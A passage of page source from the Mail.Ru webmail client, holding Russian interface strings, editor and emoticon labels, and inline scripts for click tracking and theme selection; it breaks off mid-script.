			, 'folder.trash':	'Внимание! Письма, перемещенные в Корзину более месяца назад, будут автоматически удаляться.'
			, 'folder.trash.exit':		'Включена автоматическая очистка Корзины при выходе из почты.'
			, 'letter.receipt':			'Отправитель письма запросил подтверждение о прочтении.'
			, 'letter.bannedimages':	'В данном письме обнаружено опасное содержимое, некоторые изображения заблокированы. Рекомендуем вам не переходить по ссылкам из письма и не скачивать никакие вложения.'
			, 'letter.dmarc_warning':	'Мы не можем проверить подлинность отправителя. Рекомендуем вам быть внимательнее при совершении действий, указанных в письме.'
			, 'letter.spamblack':		"Письмо попало в папку &laquo;Спам&raquo;, потому что ранее вы указали, что сообщения от отправителя <b class=\"infobar__emphasis js-email\">{0}</b> являются спамом."
			, 'letter.spaminfo':		'Письмо попало в папку &laquo;Спам&raquo;, потому что оно похоже на сообщения, которые ранее были отфильтрованы нашей системой, как спам.'
			, 'letter.imagehidden':		'Картинки отключены'
			, 'letter.mailboxsort':		{
											'text': 'Вы получаете %s от %s. <a href=\"#\" data-name=\"start\">Отфильтровать</a> эти и другие рассылки в отдельную папку?',
											'delivery.plural': ['рассылок', 'рассылку', 'рассылки'],
											'controls': {
												'accept': 'Да',
												'deny': 'Нет'
											}
										}
			, 'letters.multiselect.select':			'Отмечено {0}'
			, 'letters.multiselect.selectall':		'Отмечены все {0}'
			, 'letters.multiselect.messages.From.prefix':	'от'
			, 'letters.multiselect.messages.To.prefix':		'для'
			, 'letters.multiselect.messages': {
				  unread:		['непрочитанных', 'непрочитанное', 'непрочитанных']
				, read:			['прочитанных', 'прочитанное', 'прочитанных']
				, flagged:		['помеченных флажком', 'помеченное флажком', 'помеченных флажком']
				, attach:		['с файлами', 'с файлами', 'с файлами']
			}
			, 'filters_active.from': 'Письма переносятся из папки «{0}». Это может занять некоторое время.'
			, 'filters_active.to.one': 'Письма переносятся из папки «{0}» в папку «{1}». Это может занять некоторое время.'
			, 'filters_active.to.two': 'Письма переносятся из папок «{0}» и «{1}» в папку «{2}». Это может занять некоторое время.'
			, 'filters_active.to.many': 'Письма переносятся из {0} {1} в папку «{2}». Это может занять некоторое время.'
			, 'filters_active.folders': ['папок', 'папки', 'папок']

			, 'filters_exists.auto': 'В эту папку попадают письма от %s%s. <a class=\"pseudo-link\" data-name=\"mailbox-sort-start\" href=\"#\">Перемещать в нее другие рассылки?</a>'
			, 'filters_exists.more': 'и др'
		}


		, 'b-announcement': {
			  'mrim_disabled':			"С вашего ящика зафиксирована рассылка спама. Отправка писем заблокирована.<br>Для восстановления работы необходимо <a href=\"//r.mail.ru/clb352670/e.mail.ru/settings/security?changepass\">сменить пароль и&nbsp;указать телефон</a>."
			, 'no_space_left':			"В вашем ящике закончилось свободное место! <a class=\"js-infomessage__link\" href=\"javascript:;\">Нажмите&nbsp;сюда</a>, чтобы бесплатно увеличить объем ящика."
			, 'low_space_left':			"В вашем ящике осталось мало места. <a class=\"js-infomessage__link\" href=\"javascript:;\">Нажмите&nbsp;сюда</a> чтобы бесплатно увеличить объем ящика."
			, 'collector_status_ok':			"Сбор почты с  начнется в течение нескольких минут."
			, 'collector_status_exists':		"Сбор почты с ящика  уже настроен. Чтобы настроить сбор почты с другого домена перейдите в <a href=\"/settings/collector\">настройки</a>."
			, 'collector_status_error':			"Сбор почты с  не начался. Перейдите в <a href=\"/settings/collector?edit=1&POPEmail=\">настройки</a>, чтобы перенастроить сборщик."
			, 'collector_info_v1':			"Настройте сбор почты и вам больше не придется проверять несколько ящиков на разных сайтах!<br><a target=\"_blank\" class=\"js-accept js-infomessage__link_collector\" href=\"/settings/collector\">Настроить сбор писем</a>"
			, 'collector_info_v1.close':	"Это моя единственная почта"
			, 'collector_info_v2':			"Надоело проверять несколько ящиков? Читайте все письма в Почте Mail.Ru<br><a target=\"_blank\" class=\"infomessage__link js-accept js-infomessage__link_collector\" href=\"/settings/collector\">Настроить сбор писем</a>"
			, 'collector_info_v2.close':	"Это моя единственная почта"
			, 'collector_info_v3':			"Соберите все письма с Yandex, Рамблер и Gmail в этот почтовый ящик.<br><a target=\"_blank\" class=\"infomessage__link js-accept js-infomessage__link_collector\" href=\"/settings/collector\">Настроить сбор писем</a>"
			, 'collector_info_v3.close':	"Это моя единственная почта"
			, 'weak_password':			"Ваш почтовый ящик находится в зоне риска из-за установленного легкого пароля. Рекомендуем вам скорее <a cnt_sb=\"674969\" href=\"//r.mail.ru/clb352670/e.mail.ru/settings/security?changepass\">сменить пароль на более сложный</a>!"
			
				, 'mobile_app':			"Проверяйте почту и оставайтесь на связи, находясь вдали от компьютера.<br><a target=\"_blank\" href=\"//r.mail.ru/clo1395242/e.mail.ru/app\">Установите мобильную почту Mail.Ru</a>"
				, 'mobile_app.close':	"Спасибо, я знаю об этом"
			
			, 'weak_password_compromised':	"Ваш почтовый ящик находится в зоне риска. Рекомендуем незамедлительно <a href=\"//e.mail.ru/settings/security?changepass&announcement\">сменить пароль на более сложный</a>. <a href=\"//e.mail.ru/settings?announcement\">Перейти в настройки</a>."
			, 'acca':					"<a target=\"_blank\" href=\"//r.mail.ru/clb1577045/e.mail.ru/settings/security?acca\">Включите сохранение</a> последних действий в ящике, чтобы следить за безопасностью своего почтового ящика."
			, 'verify_phone':			"Пожалуйста <a class=\"pseudo-link\" data-name=\"addPhone\" href=\"#\">укажите</a> номер телефона. Это поможет вам не только быстро восстановить пароль в случае его потери, но и повысит уровень безопасности вашего ящика."
			, 'wrong_time':				"На вашем компьютере установлено неправильное локальное время. В связи с чем почтовый интерфейс показывается некорректно. Крайне рекомендуем вам перевести часы.<br>Вот <a target=\"_blank\" href=\"//help.mail.ru/mail-help/faq/pc_time\">тут</a> подробнее про перевод часов."
			, 'multiselect':			"Выделено %count%. <a href=\"#\" class=\"pseudo-link\" data-mnemo=\"mass-operations\" data-id=\"selectAllLetters\" data-name=\"selectAllLetters\">Выделить все письма в папке «%folder%»</a>"
			, 'multiselect_alt':		"Выделено %count%. <a href=\"#\" class=\"pseudo-link\" data-mnemo=\"mass-operations\" data-id=\"deselectAllLetters\" data-name=\"deselectAllLetters\">Снять выделение со всех писем в папке «%folder%»</a>"
			, 'mailbox_sort':	{
				  'first': {
					  'header' : "Разбери свой ящик"
					, 'text' : "Мы поможем навести порядок во «Входящих» и разложим все письма и рассылки по папкам"
				}
				, 'second': {
					  'text' : "Опять не можете найти нужные письма в папке «Входящие» из-за бесконечных рассылок? Мы поможем навести порядок."
				}
				, 'controls': {
					  'start': "Разобрать ящик"
					, 'help': "Подробнее"
				}
			}
			, 'critical_data': {
				  'phone_verify': {
					  'text': "Подтвердите телефон %phone%. Это поможет вам не только быстро восстановить пароль в случае его потери, но и повысит уровень безопасности вашего ящика."
					, 'controls': {
						  'accept': "Подтвердить"
						, 'deny': "Это не мой телефон"
					}
				}
				, 'phone_verify_remove': {
					  'text': "Вы уверены, что хотите удалить телефон %phone%?"
					, 'action_success': "Телефон %phone% удален"
					, 'controls': {
						  'remove-phone': "Да"
						, 'phone-verify': "Нет"
					}
				}
				, 'phone_noverify_verified': {
					  'text': "Телефон %phone% потвержден и будет доступен для восстановления пароля после %twoweek%."
				}
				, 'phone_noverify_removed': {
					  'text': "Телефон %phone% удален."
				}
				, 'phone_verify_removed': {
					  'text': "Телефон %phone% поставлен в очередь на удаление."
				}
				, 'phones_verify_removed': {
					  'text': "Телефоны %phone% поставлены в очередь на удаление."
				}
				, 'phone_access': {
					  'text': "У вас есть доступ к телефону %phone%? На данный номер будет отправлен код для восстановления пароля от ящика %user_email%, если вы потеряете к нему доступ."
					, 'text_many': "У вас есть доступ ко всем телефонам: %phone%? На эти номера будет отправлен код для восстановления пароля от ящика %user_email%, если вы потеряете к нему доступ."
					, 'action_success': "Телефонный номер %phone% поставлен в очередь на удаление"
					, 'controls': {
						  'accept': "Да"
						, 'deny': "Нет"
					}
				}
				, 'email_access': {
					  'text': "У вас есть доступ к ящику %email%? На указанный ящик будет выслана ссылка для смены пароля от %user_email%, если вы потеряете к нему доступ."
					, 'controls': {
						  'accept': "Да"
						, 'deny': "Нет"
					}
				}
				, 'email_remove': {
					'text': "Дополнительный адрес %email% удален из способов восстановления доступа к ящику %user_email%"
				}
				, 'secret_question': {
					  'text': "Помните ответ на секретный вопрос «%question%»?<br/>Данный ответ поможет вам восстановить пароль от почтового ящика, если вы потеряете к нему доступ."
					, 'action_success': "Секретный вопрос удален из настроек ящика"
					, 'controls': {
						  'accept': "Да"
						, 'deny': "Нет"
					}
				}
				, 'secret_question_removed': {
					'text': "Секретный вопрос %question% удален."
				}
				, 'secret_question_removed_nophones': {
					'text': "Секретный вопрос %question% удален. Для безопасности вашего ящика рекомендуем <a href=\"#\" class=\"pseudo-link\"  data-name=\"add-phone\">указать телефон</a>."
				}
			}
			, 'last_login':	{
				  'settings':		"настроить"
				, 'settings_acca':		"Сохранять последние действия в ящике"
				, 'settings_acca_on':	"Больше информации"
				, 'current_ip':		"Ваш текущий адрес:"
				, 'last_login':		"Предыдущий вход:"
			}
		}
		, 'b-prefoot': {
			
				
			
			'html':			'Защищён <a href=\"http://www.kaspersky.ru/advert/home-security?campaign=kl_mailgroup&redef=1&THRU&referer1=kl_mailgroup_pochta&referer2=kl_mailgroup_pochta\" target=\"_blank\" class=\"b-kav-protected__link\" data-name=\"antivirus\">АнтиВирусом</a> и <a href=\"http://www.kaspersky.ru/advert/home-security?campaign=kl_mailgroup&redef=1&THRU&referer1=kl_mailgroup_pochta&referer2=kl_mailgroup_pochta\" target=\"_blank\" class=\"b-kav-protected__link\" data-name=\"antivirus\">АнтиСпамом</a> Касперского'
		}
		, 'b-layer': {
			'mailbox-sort': {
				  'сommon.newfolder': 'Новая папка'
				, 'сommon.sales': 'Скидки'
				, 'сommon.maillists': 'Рассылки'
				, 'сommon.social': 'Социальные сети'
				, 'controls.prev': 'Назад'
				, 'controls.next': 'Продолжить'
				, 'controls.finish': 'Завершить'
				, 'controls.close': 'Закрыть'
				, 'intro.delivery.plural': ['рассылок', 'рассылку', 'рассылки']
				, 'intro.sender.pural': ['отправителей', 'отправителя', 'отправителей']
				, 'intro.title': "Здравствуйте! За этот месяц вы получили <strong class=\"popup__head__nobreaks\">%s</strong>&nbsp;от&nbsp;<strong class=\"popup__head__nobreaks\">%s</strong>"
				, 'intro.subtitle': 'Не все рассылки важны, но все они попадают в папку «Входящие», мешая быстро находить нужные письма.'
				, 'intro.noread': 'Не читаете'
				, 'intro.anddel': 'и удаляете'
				, 'intro.ignore': 'Игнорируете'
				, 'intro.moreweek': 'больше недели'
				, 'intro.delete': 'Удаляете'
				, 'intro.afterread': 'после прочтения'
				, 'intro.read': 'Читаете'
				, 'intro.andsave': 'и сохраняете'

				, 'main.title': 'Навести порядок во «Входящих» очень просто!'
				, 'main.subtitle': 'Перетащите рассылку в любую папку. Рассортируйте таким образом все получаемые рассылки, и письма будут приходить сразу в правильные папки.'
				, 'main.subtitle_touch': 'Выберите рассылку и нажмите на название папки. Рассортируйте таким образом все получаемые рассылки, и письма будут приходить сразу в правильные папки.'
				, 'main.phantom.title': 'Добавить папку'
				, 'main.renew.first': 'Отменить изменения'
				, 'main.renew.second': 'Вернуть все как было'
				, 'main.makeread': 'Помечать письма прочитанными при перемещении из папки в папку'
				, 'main.category.mailing': 'Рассылки'
				, 'main.category.social': 'Социальные сети'
				, 'main.category.actions': 'Промо-акции'
				, 'main.inbox.title': 'Входящие'
				, 'main.unsubscribe.title': 'Спам'
				, 'main.dropdown.create': 'Создать папку'
				, 'main.dropdown.rename': 'Переименовать'
				, 'result.title': 'Вы отлично справились, поздравляем!'
				, 'result.info_head': 'Вы закончили сортировать письма-рассылки.'
				, 'result.info_body': 'Сортировка займет некоторое время, а пока вы можете продолжить работу с Почтой.'
				, 'result.subinfo': 'Если вы подпишетесь на новую рассылку, ее всегда можно добавить в&nbsp;одну из специальных папок в <a href=\"/settings/filters\">настройках Почты</a>.'
				, 'notready.title': 'Поздравляем вас, в вашем ящике полный порядок'
				, 'notready.info_head': 'На данный момент мы не нашли писем-рассылок в вашем почтовом ящике, которые необходимо рассортировать.'
				, 'notready.subinfo': 'Если в дальнейшем, вы подпишетесь на рассылки, их всегда можно будет добавить в одну из специальных папок в <a href=\"/settings/filters\">настройках Почты</a>.'
			}

			, 'septima-on': {
				  'title':    "Идет обновление Почты"
				, 'subtitle': "Это займет несколько секунд. Скоро ваша почта изменится."
				, 'stages':  ["В данный момент наш верстальщик настраивает шрифты", "А дизайнер перекрашивает иконки", "Программисты ускоряют отправку и получение писем", "Запускаем новый поиск", "Улучшаем интерфейс"]
				, 'seconds': ["секунд", "секунда", "секунды"]
			}
			, 'archive' : {
				'title': "Настройка архивирования писем"
				, 'description': "Вы можете настроить перенос писем в выбранную папку в один клик."
				, 'moveto': "Перемещать письма в папку"
				, 'create': "Создать новую папку «Архив»"
				, 'submit': "Сохранить"
				, 'cancel': "Отменить"
				, 'archive': "Архив"
			}
			, 'shortcuts': {
				  'title': "Горячие клавиши"
				/*, 'after': "<span class=\"shortcuts__item__shortcut__mod\">затем</span>"*/
				, 'after': "затем"
				, 'general': {
					  'title': "Общие"
					, 'help': "Вызов справки по хоткеям"
					, 'compose': "Написать письмо"
					, 'search': "Поиск"
					, 'addressbook': "Перейти в адресную книгу"
					, 'create_folder': "Создать папку"
				}
				, 'letters': {
					  'title': "Список писем"
					, 'prev_next': "Предыдущее/следующее письмо"
					, 'prev_next_page': "Предыдущая/следующая страница"
					, 'open_letter': "Переход к письму"
					, 'select_letters': "Выделить письма"
					, 'select_letter': "Отметить письмо в списке/снять выделение"
					, 'select_all': "Выделить все письма/снять выделение"
					, 'go_inbox': "Перейти во Входящие"
					, 'go_draft': "Перейти в Черновики"
					, 'go_sent': "Перейти в Отправленные"
					, 'go_flagged': "Перейти в «Помеченные флажком»"
					, 'move': "Переместить в папку"
					, 'read': "Пометить прочитанными"
					, 'unread': "Пометить непрочитанными"
					, 'flag': "Пометить флажком/Снять флажок"
					, 'remove': "Удалить"
					, 'archive': "В архив"
					, 'more': "Еще действия"
					, 'spam': "Это спам/Не спам"
				}
				, 'compose': {
					'title': "Написание письма"
					, 'send': "Отправить письмо"
					, 'save': "Сохранить черновик"
					, 'attach': "Прикрепить файл"
					, 'add_cc': "Добавить поле «Копия»"
					, 'add_bcc': "Добавить поле «Скрытая»"
					, 'add_from': "Изменить адрес отправителя"
				}
				, 'readmsg': {
					'title': "Чтение письма"
					, 'close_letter': "Выход из письма"
					, 'prev_next_letter': "Предыдущее/следующее письмо"
					, 'remove_letter': "Удалить письмо"
					, 'archive': "В архив"
					, 'spam': "Это спам/Не спам"
					, 'reply': "Ответить"
					, 'replyall': "Ответить всем"
					, 'forward': "Переслать"
					, 'flag': "Пометить флажком/Снять флажок"
					, 'read': "Пометить прочитанным"
					, 'unread': "Пометить непрочитанным"
					, 'print': "Распечатать"
					, 'add': "Добавить отправителя в&nbsp;адресную книгу"
					, 'move': "Переместить в папку"
					, 'more': "Еще действия"
					, 'create_filter': "Создать фильтр"
					, 'search': "Найти все письма отправителя"
				}
			},
			'create-filter' : {
				'title': "Создание правила фильтрации",
				'description': 'Перемещать все новые письма от&nbsp;<b>%s</b> в&nbsp;папку «%s»?',
				'description_long': 'Перемещать все новые письма от&nbsp;<span class=\'balloon__message__interactive\' title=\'%s\'>%s&nbsp;отправителей</span> в&nbsp;папку «%s»?',
				'checkbox': "Переместить все старые письма",
				'submit': "Перемещать автоматически",
				'settings': "Настроить",
				'cancel': "Не перемещать"
			}
		}
		, 'b-atop': {
			'text': 'Вверх'
		}
		, 'b-contact-informer': {
			'send': 'Написать'
			, 'add': 'В контакты'
			, 'added': 'В контактах'
			, 'search': 'Найти письма от'
		}
		, 'b-langmark': {
			'threads.on': "Чтобы включить группировку писем<br>по теме воспользуйтесь меню «Вид»<br>над списком писем",
			'threads.off': "Чтобы выключить группировку писем<br>по теме воспользуйтесь меню «Вид»<br>над списком писем",
			'fast-reply-toolbar.on': "Нажмите, чтобы отправить письмо.<br>Переключайтесь между ответом и пересылкой по клику на стрелку."
		}
        , 'b-balloon': {
			'create-event': {
				'desc_one':'Создайте событие из письма и получите уведомление по почте и SMS',
				'desc_many':'Создайте событие из письма и пригласите всех участников'
			}
		}

		, 'b-cleaner-widget': {
			'title': 'Автоматическая фильтрация рассылок'
			, 'messages.plural': ['писем-рассылок', 'письмо-рассылка', 'письма-рассылки']
			, 'messages.senders': ['отправителей', 'отправитель', 'отправителя']
			, 'info.stat': 'За последний месяц вы получили <strong>%s&nbsp;%s</strong>, из которых <strong>%s%</strong> вы не просматривали.'
			, 'info.help': 'Чтобы оставить во Входящих только важные письма, воспользуйтесь автоматической фильтрацией рассылок, которая поможет вам&nbsp;разложить рассылки по папкам «Скидки», «Социальные&nbsp;сети» и&nbsp;«Рассылки».'
			, 'controls.sort': 'Отфильтровать рассылки'
			, 'controls.sort_second': 'Настроить фильтрацию рассылок'
			, 'controls.reset': 'Отменить фильтрацию'
			, 'filters.condition': 'Письма от:&nbsp;'
			, 'filters.senders.additional': 'еще %s %s'
			, 'filters.senders.and': 'и'
			, 'filters.action.move': 'Поместить в папку «%s»'
			, 'filters.action.makeread': 'Пометить прочитанным'
		}

		, 'b-snippet': {
			'notfound': 'Извините, мы не нашли страницу по ссылке'
		}

	});

});
</script>



<script type="text/javascript">
patron.tinyMCEStrings = {
	'font_size': 'Размер',
	'fontdefault': 'Шрифт',
	'bold_desc': 'Жирный текст',
	'italic_desc': 'Наклонный текст',
	'underline_desc': 'Подчеркнутый текст',
	'striketrough_desc': 'Зачеркнутый текст',
	'justifyleft_desc': 'По левому краю',
	'justifycenter_desc': 'По центру',
	'justifyright_desc': 'По правому краю',
	'bullist_desc': 'Маркированный',
	'numlist_desc': 'Нумерованный',
	'outdent_desc': 'Уменьшить отступ',
	'indent_desc': 'Увеличить отступ',
	'undo_desc': 'Отменить действие',
	'redo_desc': 'Повторить действие',
	'link_desc': 'Ссылка',
	'cleanup_desc': 'Очистить форматирование',
	'hr_desc': 'Горизонтальная линия',
	'removeformat_desc': 'Очистить форматирование',
	'forecolor_desc': 'Цвет текста',
	'backcolor_desc': 'Цвет фона',
	'justifyselect_desc': 'Выравнивание',
	'moreactions_desc': 'Дополнительно',
	'fontactions_desc': 'Шрифт',
	'textindentactions_desc': 'Отступ',
	'bullistactions_desc': 'Список',
	'emotions_desc': 'Смайлики',
	'apptransfer_desc': 'Перевести текст',
	'appkeyboard_desc': 'Клавиатура',
	'apptranslit_desc': 'Транслитерация',
	'appspelling_desc': 'Проверить орфографию',
	'apppresents_desc': 'Мои подарки',
	'appmailstatistic_desc': 'Статистика письма',
	'appcripto_desc': 'Крипто',
	'moreapps_desc': 'Ещё приложения',
	'signature_desc': 'Подпись',
	'signature_addsign': 'Добавить подпись',
	'signature_editsign': 'Изменить подпись',
	'design_desc': 'Стили',
	'cards_desc': 'Открытки',
	'enabletexteditor_desc': 'Убрать оформление',
	'enablehtmleditor_desc': 'Расширенное оформление',
	'more': 'Еще',
	'font_normal_label': '(нормальный)',
	'add_link_form_href_label': 'Введите адрес ссылки',
	'add_link_form_title_label': 'Введите текст ссылки',
	'add_link_form_add': 'Добавить',
	'add_link_form_cancel': 'Отмена',
	'appearance_without_style': 'Без стиля',
	'cards_without': 'Без открытки',

	'smiles': [
		{
			'title': 'Колобки',
			'list': {
				'angel': 'Ангелочек',
				'bad': 'Тошнит',
				'biggrin': 'Улыбка до ушей',
				'blum': 'Дразнюсь',
				'blush': 'Смущаюсь',
				'cray': 'Рыдаю',
				'crazy': 'Сумасшествие',
				'dance': 'Танцую',
				'diablo': 'Чертовски злюсь',
				'dirol': 'Я круче',
				'drinks': 'Пиво',
				'fool': 'Ты что!',
				'give_rose': 'Дарю цветочек',
				'good': 'Ок!',
				'kiss_mini': 'Целую',
				'man_in_love': 'Поцеловали',
				'mocking': 'Хихикаю',
				'music': 'Слушаю музыку',
				'nea': 'Не-а',
				'pardon': 'Извини',
				'rofl': 'Лопну от смеха',
				'rolleyes': 'Мечтаю',
				'sad': 'В печали',
				'scratch_one-s_head': 'Надо подумать',
				'shok': 'Ой, ё',
				'shout': 'Кричу',
				'smile': 'Улыбаюсь',
				'unknw': 'Не знаю',
				'wacko2': 'В изнеможении',
				'wink': 'Подмигиваю',
				'yahoo': 'Уррра!',
				'boian': 'Бойан',
				'kut': 'Ктулху'
			}
		},
		{
			'title': 'Классические',
			'list': {
				'smile': ':)',
				'blink': ';)',
				'laughter': ':-))',
				'bee': ';-P',
				'coolguy': '8-)',
				'biggrin': ':-D',
				'pig': '}:o)',
				'bazilio': '$-)',
				'hm': ':-\'',
				'dissapointed': ':-(',
				'tears': '8-(',
				'cry': ':\'(',
				'crocodile': ':\'\'()',
				'really': 'S:-o',
				'oo': '(:-o',
				'amazed': '8-0',
				'aaa': '8-[o]',
				'bullshit': '):-p',
				'angry': '):-(',
				'rrr': '):-$',
				'zloradstvo': '):-D',
				'biganger': ':-E',
				'devil': 'Чертенок',
				'vampire': 'Вампирчик',
				'plug': ':-][',
				'detzl': ':-|',
				'sceptic': 'B-j',
				'shy': ':~o',
				'ass': '(_I_)',
				'heart': 'Сердце',
				'kiss': ':-*',
				'sleepy': 'Сплю',
				'live': 'Отлично!',
				'victory': 'Peace!',
				'ok': 'OK',
				'koza_left': 'Левая \"коза\"',
				'koza_right': 'Правая \"коза\"',
				'die': 'Плохо',
				'fingerup': 'Внимание!',
				'kukes': 'Фига',
				'fist': 'Кулак',
				'fuck': 'Отвали!'
			}
		},
		{
			'title': 'Анимированные',
			'list': {
				'angel': 'Ангелочек',
				'appl': 'Аплодисменты',
				'beauty': 'Красотка',
				'beer': 'Пиво',
				'book': 'Читаю',
				'could': 'Мёрзну',
				'cry': 'Рыдаю',
				'dance': 'Танцую',
				'devil': 'Чертовски злюсь',
				'eat': 'Жую',
				'fight': 'Побью',
				'fingal': 'Побили',
				'flowr': 'Дарю цветочек',
				'gg': 'Смеюсь',
				'gg2': 'Смеюсь и плачу',
				'gift': 'Подарок',
				'hungry': 'Ворчу',
				'kiss': 'Целую',
				'love': 'Люблю',
				'pistolet': 'Застрелю',
				'poison': 'Выпей яду',
				'rainbow': 'Лучезарно',
				'red': 'Смущаюсь',
				'sad': 'Расстраиваюсь',
				'sing': 'Пою',
				'skuka': 'Скучаю',
				'sleep': 'Засыпаю',
				'smile': 'Улыбаюсь',
				'tongue': 'Показываю язык',
				'victory': 'Peace!',
				'wonder': 'Удивляюсь',
				'blew': 'Тошнит'
			}
		},
		{
			'title': 'Продвинутые',
			'list': {
				'c03': 'Улыбаюсь',
				'c05': 'Злорадствую',
				'c07': 'Радуюсь',
				'c09': 'Старичок',
				'c11': 'Свирепствую',
				'c13': 'Пугаюсь',
				'c21': 'Показываю язык',
				'c22': 'Умник',
				'c23': 'Алкоголик',
				'c24': 'Вояка',
				'c25': 'Удивляюсь',
				'c26': 'Чертовски злюсь',
				'c33': 'Расстраиваюсь',
				'c34': 'Панк',
				'c35': 'Лопну от смеха',
				'c36': 'Подмигиваю',
				'c37': 'Думаю',
				'c38': 'Люблю',
				'c45': 'Подавлен',
				'c46': 'Рыдаю',
				'c47': 'Сейчас расплачусь',
				'c48': 'Злюсь',
				'c49': 'Тошнит',
				'c50': 'Сумасшествие',
				'c57': 'Целую',
				'c58': 'Поцеловали',
				'c59': 'Красотка',
				'c60': 'Ангелочек',
				'c61': 'Подозрительно',
				'c62': 'Жую',
				'c69': 'Смущаюсь',
				'c70': 'Стыдно'
			}
		},
		{
			'title': 'Иронические',
			'list': {
				's001': 'Ура!',
				's002': 'Привет!',
				's003': 'Кушаю',
				's004': 'Танцую',
				's006': 'Пока!',
				's007': 'Слушаю музыку',
				's008': 'Помоги',
				's009': 'Бабло!',
				's010': 'Да!',
				's011': 'Головой об стену',
				's012': 'В атаку!',
				's013': 'Пацанчик',
				's014': 'Нет!',
				's015': 'Мир!',
				's016': 'Дракончик'
			}
		},
		{
			'title': 'Гиганты',
			'list': {
				's001': 'Лопну от смеха',
				's002': 'Чертовски злюсь',
				's003': 'Секрет',
				's004': 'В изнеможении',
				's017': 'Требую',
				's006': 'Целую',
				's007': 'Обида',
				's008': 'Устал',
				's009': 'Подмигиваю',
				's010': 'Гадость',
				's011': 'Виноват',
				's013': 'Разочарование',
				's014': 'Сплю',
				's015': 'Ой, ё',
				's016': 'Прыгаю',
				's020': 'Подозреваю',
				's018': 'Тошнит'
			}
		},
		{
			'title': 'Романтические',
			'list': {
				's001': 'Обожаю тебя',
				's002': 'Ангелок',
				's004': 'С любовью',
				's003': 'Девочка с косичками',
				's020': 'Целую',
				's005': 'Сердечко',
				's019': 'Дарю цветочек',
				's006': 'Крылья любви',
				's011': 'Кондитер',
				's010': 'Голубки',
				's007': 'Тюльпаны',
				's008': 'Сердце',
				's009': 'Купидон',
				's012': 'Карусель',
				's013': 'Кот',
				's014': 'Пёс',
				's015': 'Заяц с цветком',
				's016': 'Бабочка',
				's017': 'Цветы',
				's018': 'Букет'
			}
		},
		{
			'title': 'Новогодние',
			'list': {
				'a1': 'Новогодний шар',
				'a2': 'Носок подарков',
				'a3': 'Карамелька',
				'a4': 'Снеговик',
				'b1': 'Ель',
				'b2': 'Шампанское',
				'b3': 'Варежка',
				'b4': 'Я - сам Новый год!',
				'c1': 'Подмигиваю',
				'c2': 'Новогодний смех',
				'c3': 'Дед Мороз',
				'c4': 'Снегурочка',
				'd1': 'Звезда',
				'd2': 'Подарок',
				'd3': 'Зайчик с морковкой',
				'd4': 'Ослик',
				'e1': 'Колокольчик',
				'e2': 'Снежинка',
				'e3': 'Парад звезд',
				'e4': 'Куранты',
				'f1': 'Мешок подарков',
				'f2': 'Еловая ветка'
			}
		}
	]
};
</script>



	

	

	

	

	

	
		<script>includeJS("//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/build/Login.js");</script><script type="text/javascript" src="//js.imgsmail.ru/mail/e/utf/ts/1442859548/images/js/ru/build/Login.js"></script>

	

	





<script>
	__domTS('head__jsf');


	require(['utils/jsHistory'], function (){
		jsHistory.trust			= /\/(?=messages?|compose|msglist|readmsg|sentmsg|search|gosearch|thread|sendmsgok|filesearch|ajax_attach_action|attaches\-viewer|agent|password\/restore|passremind|attach-viewer|attachment)/i;
		jsHistory.distrust		= /\/settings/i;
		jsHistory.disabled		= !jsHistory.trust.test(location.href) || jsHistory.distrust.test(location.href);
	});


	require(['jquery'], function ($) {
		var w = window,
			d = w.document,
			_revent	= /js-event-([^$]+)/;

		if (patron._abstractActions !== null) {
			patron._abstractActions = [];

			$(document).bind('toolkitclick ui-abstract-action', function () {
				patron._abstractActions && patron._abstractActions.push(arguments);
			});
		}


		$(document)
			.trigger('updatemessagescount', [Number('')])
			.ajaxError(function (event, jqXHR, options, thrownError){
				require(['patron.utils/patron.Utils'], function () {
					patron.Utils.catchAjaxError(event, jqXHR, options, thrownError);
				});
			})
			.mousedown(function (evt){
				var elm = evt.target, id;
				do {
					if( elm && elm.getAttribute ){
						if( (id = elm.getAttribute('cnt_sb')) ){
							(new Image).src = '//rs.' + patron.SingleDomainName + '/sb'+ id +'.gif?rnd='+ Math.random();
							break;
						}
						else if( (id = elm.getAttribute('cnt_d')) ){
							(new Image).src = '//rs.' + patron.SingleDomainName + '/d'+ id +'.gif?rnd='+ Math.random();
							break;
						}
					}
					if (elm && typeof elm.className === 'string') {
						if (elm.className.match(_revent)) {
							$(window).triggerHandler(RegExp.$1);
						}
					}
				}
				while( (elm = elm.parentNode) && (elm !== this) );
			})
		;
	});

	(function () {
		patron.currentTheme = '' || 'default';
		
	})();

	

	
</script>










	<script>__domTS('head__js')('head__css');</script>
	
	<link href="https://img.imgsmail.ru/mail/e/utf/ts/1442859548/css/septima/pages/main-flat.css?v=1442859548" rel="stylesheet" type="text/css">



	
	







	
	

<style type="text/css">
	/*
		
	*/
	#nojs .nojsdn { display:none; }
	#LEGO { min-height: 0px; }
</style>

<script>
	(function () {
		var exps = {
				'enableIncreaseFont': ' increase-font',
				'enableIncreaseFont2': ' increase-font-2'
			},
			htmlClassName = '';

		for (var feauture in exps) {
			if (exps.hasOwnProperty(feauture) && patron[feauture]) {
				htmlClassName += exps[feauture];
			}
		}

		if (htmlClassName) {
			document.documentElement.className += htmlClassName;
		}

		document.write('<style type="text/css">.jsdn {display: none;} .jsvh {visibility: hidden;}</style>');
		document.documentElement.id = 'jsHtml';
		document.documentElement.className += ' jsHtml';

		if( !window.opera && !!document.createElementNS && !!document.createElementNS("http://www.w3.org/2000/svg", "svg").createSVGRect ){
			document.documentElement.className += ' svg';
		} else {
			document.documentElement.className += ' no-svg';
		}

		

		function getRandomThemeVariant(variants) {
			return variants[Math.floor(Math.random() * variants.length)];
		}

		function chooseTheme(themeId){
			var themeConfig = patron.themes.get(themeId),
				themeVariant = 'all',
				hours = (new Date()).getHours();
			if (themeConfig && themeConfig.variants) {
				if (themeConfig.currentVariant) {
					themeVariant = themeConfig.currentVariant;
				} else {
					themeVariant = themeConfig.currentVariant = getRandomThemeVariant(themeConfig.variants);
				}
			} else {
				switch (themeId) {
					case 't1016':
						if (hours >= 6 && hours < 12){
							themeVariant = "morning";
						} else if (hours >= 12 && hours < 18){
							themeVariant = "day";
						} else if (hours >= 18 && hours < 22){
							themeVariant = "evening";
						} else {
							themeVariant = "night";
						}
					break;

					case 't1032':
					case 't1060':
						if (hours >= 7 && hours < 19){
							themeVariant = "day";
						} else {
							themeVariant = "night";
						}
					break;
					case 't1189':
						if (themeConfig) {
							var widget = themeConfig.widget;
							if (widget && widget.data) {
								themeVariant = themeConfig.currentVariant = "v" +  widget.data.sign;
							}
						}
					break;
					case 't3000':
						if (themeConfig) {
							var widget = themeConfig.widget;
							if (widget && widget.data) {
